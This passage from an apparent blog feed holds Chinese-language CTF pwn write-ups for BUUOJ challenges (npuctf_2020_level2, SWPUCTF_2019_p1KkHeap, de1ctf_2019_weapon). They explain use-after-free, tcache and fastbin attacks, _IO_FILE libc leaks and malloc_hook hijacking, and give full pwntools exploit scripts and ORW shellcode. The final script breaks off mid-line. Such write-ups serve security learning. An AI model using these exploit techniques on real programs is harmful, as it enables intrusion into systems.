class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+i).encode()+<span class="string">b&#x27;c%9$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    val=shell&amp;<span class="number">0xffff</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(val).encode()+<span class="string">b&#x27;c%35$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    success(<span class="string">&#x27;debug:&#x27;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line">    shell&gt;&gt;=<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">success(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(libc_addr+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;66666666\0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#npuctf_2020_level2&quot;&gt;npuctf_2020_level2&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF_2019_p1KkHeap writeup</title>
    <link href="http://example.com/2021/11/10/SWPUCTF_2019_p1KkHeap/"/>
    <id>http://example.com/2021/11/10/SWPUCTF_2019_p1KkHeap/</id>
    <published>2021-11-10T14:00:00.000Z</published>
    <updated>2021-12-15T17:22:12.247Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap">SWPUCTF_2019_p1KkHeap</a></p><span id="more"></span><p>这波又刷新了我对2.27版本libc的认知。那就是tcache struct ，话不多说看题。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>64位保护全开，习惯就好。载入IDA查看发现plt表有很多函数，其中有<code>mmap</code>和<code>prctl</code>，<code>prctl</code>最常见的就是设置沙箱规则，<code>mmap</code>最常见的就是直接给一个可读可写可执行的一片内存区域，那么我们返回终端查看一下沙箱规则。</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/1.png" alt="1"></p><p>这个有点复杂，不过大概率就可以认为他给你禁用了<code>execve</code>，其它的基本不用管，大概意思就是<code>write</code>函数的<code>count</code>必须非负，且大小在32位int范围内，并且不能=0x10，有一说一这个0x10并不理解为啥限制这个不能等于0x10，因为我读<code>flag</code>一般是读0x40</p><p>我们看看初始化函数，可以看到<code>mmap</code>分配了一片很大的内存并且是可读可写可执行的权限，那么开了沙箱之后我们就能往里面写<code>orw</code>的<code>shellcode</code>，然后再劫持某些东西让它跳转到这个区域。</p><p>分析逻辑， 经典堆菜单题目，包含了增删改查，但是有一个全局变量一直在++并且循环并非while 1，可以发现这个初始值为0x12，意味着我们只能操作18次。先看删除，发现删除没有把指针清零，存在<code>UAF</code>，但是会把另一个东西清零，并且跟外面一样，删除有次数限制，只有三次机会。添加堆块会现寻找第一个指针不为0的指针，然后分配，最多同时存在八个堆块，size被限定在0x100以内。<code>show</code>会直接打印堆块上面的信息，<code>edit</code>就是根据输入的<code>size</code>读入数据，删除会导致无法edit，但是不影响show，所以这个地方可以用于泄露，后面的利用也都以uaf为基础攻击。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>这里需要注意，glibc在2.26版本加入了tcache，tcache在堆上管理，会分配一个0x250大小的堆块，这就是一个tcache struct 上面会存储每个size tcache 的个数和tcache第一个堆块的地址。首先double free然后show 泄露heap的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>泄露了之后我们接下来需要申请堆块到tcache struct上面来进行一些操作方便我们修改某些东西。我们都知道，每个大小的tcache bin最多存在7个，超过则会对应进入fastbin 或者 unsorted bin。那么我们把size改成7然后再free 再show就可以泄露libc的地址了。我们还可以顺便把第一个tcache的地址改成那个分配的可读可写可执行的区域，等会直接申请就可以在上面写数据了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>最后比较简单，就是写shellcode orw然后劫持malloc hook而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br></pre></td></tr></table></figure><p>来看看结果吧</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/2.png" alt="2"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line">p=process(file_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29949</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./SWPUCTF_2019_p1KkHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;=&#x27;)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap&quot;&gt;SWPUCTF_2019_p1KkHeap&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>de1ctf_2019_weapon writeup</title>
    <link href="http://example.com/2021/11/07/de1ctf_2019_weapon/"/>
    <id>http://example.com/2021/11/07/de1ctf_2019_weapon/</id>
    <published>2021-11-07T14:00:00.000Z</published>
    <updated>2021-12-15T17:22:23.455Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#de1ctf_2019_weapon">de1ctf_2019_weapon</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec一波，保护全开，ida分析，发现时经典的堆菜单题目。有add，delete和edit操作，没有show函数，并且保护全开无法劫持got表。那么这题大概率是要用IO来泄露libc了。</p><p>add函数把堆块申请范围限制在了0x60以内，也就是说我们只能申请fastbin大小的堆块。edit函数就是中规中矩的按照之前的size修改堆块的内容。delete函数在堆块被free之后没有把指针置空存在UAF的漏洞。那么我们的思路大概就是先通过uaf进行堆块重叠然后修改size，free之后得到一个unsorted bin，然后再修改回fastbin将它申请到stdout附近通过IO泄露libc地址，最后再来一次fastbin attack劫持malloc hook放上onegadget 去getshell，这题需要用realloc 调整栈来适应onegadget，我们后面再说。</p><h2 id="泄露libc的地址"><a href="#泄露libc的地址" class="headerlink" title="泄露libc的地址"></a>泄露libc的地址</h2><p>因为地址都是未知的，所以一开始要通过释放两个相同大小的fastbin来让其中一个fastbin中留下另一个fastbin的地址，再通过修改最后一字节让fastbin的fd来让第二个chunk申请到可以造成堆重叠的地方便于我们修改size。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))<span class="comment">#在合适的地方伪造chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#提前free让fastbin中存在这个chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/07/de1ctf_2019_weapon/1.png" alt="1"></p><p>可以看到第一个chunk的fd已经有了第四个chunk的地址，并且在第一个堆块中存在一个伪造的0x61作为fake chunk的size，所以接下来我们只要edit 0 \x50就能够产生fastbin attack了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))<span class="comment">#修改第二个堆块的size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#释放unsorted bin 让bin的fd中留下libc的地址</span></span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这一波操作就能成功泄露libc了，但是由于内存页是后三位对齐，我们填充是以字节为单位的，所以这里需要爆破一半个字节。</p><h2 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h2><p>这里没什么好说的，就是通过uaf的方法把堆块申请到malloc_hook-0x23的地方，写mallochook为reallochook，再把realloc hook写上对应的one gadget，这里需要注意的是realloc不一定直接就行了，需要适当跳过一些push或这pop之类的指令来调整栈中的0到合适的位置，这里我用了第2个onegadget，用realloc + 4的地方来调整栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后附上爆破的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line">p=process(file_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29410</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./de1ctf_2019_weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span 